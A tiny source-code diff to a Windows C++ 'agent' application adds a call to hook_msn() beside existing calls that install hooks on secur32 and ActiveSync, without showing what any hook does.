@@ -79,6 +79,7 @@ BOOL CAgentApp::InitInstance()
   hook_secur32();
   //hook_httpapi();
   hook_activesync();
+  hook_msn();
 
   return TRUE;
 }
